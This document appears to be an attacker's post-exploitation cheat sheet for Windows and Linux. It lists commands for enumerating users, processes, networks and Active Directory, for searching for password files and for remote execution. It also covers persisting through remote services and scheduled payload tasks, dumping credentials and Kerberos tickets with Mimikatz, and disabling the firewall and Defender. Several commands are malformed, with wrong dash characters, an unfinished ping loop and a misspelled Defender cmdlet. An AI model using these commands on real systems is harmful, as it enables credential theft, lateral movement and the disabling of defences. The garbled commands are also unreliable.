## Account Discovery :
• Current user
````
C:\> whoami
 ````
• Windows
````
C:\> net user
C:\> net group
C:\> net localgroup
``````

• Linux and UNIX
````
$ groups
$ cat /etc/passwd
``````
## Processes Running on target 
- Windows
````
C:\> tasklist
C:\> sc
C:\> net start
```````
• Linux and UNIX
``````
$ ps
$ top
````````
## Network Enumeration: 

- Windows:
```
C:\> ipconfig /all
C:\> netstat –na
C:\> net session
C:\> C:\> ipconfig /displaydns
`````
• Linux and UNIX:
````
# ifconfig
# netstat –natu
```````
– Linux, UNIX, and Windows:
```````
netstat –nr
arp –a
``````````
## Internal Scanning

- ping 10.0.0.1
````
C:\> for /L %i in (1,1,255) do @ping –n 1
````````
- find "TTL"
```
PS C:\> 1..255 | % {ping –n 1 10.0.0.$_ | sls ttl}
`````
- Listing computer in sysyem
`````
C:\> wmic computersystem LIST full
C:\> wmic /node:[targetIP] /user:[admin_user] /password:[password] computersystem LIST full
``````
- File Search:
```
C:\> wmic DATAFILE where "drive='C:' AND Name like '%password%’” GET Name,readable,size /VALUE
`````
## AD Enumeration:
- Local User Accounts:
```
C:\> wmic USERACCOUNT Get Domain,Name,Sid
```````
- Domain Enumeration:
````
C:\> wmic NTDOMAIN GET DomainControllerAddress,DomainName,Roles /VALUE
```````
- List all Users:
`````
C:\> wmic /NAMESPACE:\\root\directory\ldap PATH ds_user GET ds_samaccountname
``````
- Members of a Group:
``````
C:\> wmic /NAMESPACE:\\root\directory\ldap PATH ds_group where "ds_samaccountname='Domain Admins'" Get ds_member /Value
````````
- List all computers:
````
C:\> wmic /NAMESPACE:\\root\directory\ldap PATH ds_computer GET ds_samaccountname
``````
## Persistance using command shells:

- Execute Remote Commands:
```
C:\> wmic process call create "cmd.exe /c calc.exe"
``````
## Make persistance using service process:
 ````
 C:\> sc \\[targetIP] create netcat binpath= "cmd.exe /k <executable>"
 C:\> sc \\[targetIP] start [svcname]
 ````````
- Finding Scheduled processes:
 ```
  C:\> sc query schedule 
  C:\> schtasks /create /tn [taskname] /sc [frequency] /st [starttime] /sd [startdate] /tr [payload]
  ``````
##  Mimikatz Dumping:
 ```` 
 # privilege::debug
 # sekurlsa::logonpasswords
 # sekurlsa::tickets /export
 # vault::cred
 # vault::list
 # token::elevate
 # lsadump::sam
 # lsadump::secrets
 # lsadump::cache
```````
## Turn off your firewall:
- Turn of Firewall:
```
C:\> netsh advfirewall set allprofiles state off
ps:\> Set MpPreferance RealTimeMonitoringSystemOf: $True
```````
- Antivirus:
`````````
C:\> wmic /namespace:\\root\securitycenter2 path antivirusproduct
``````````
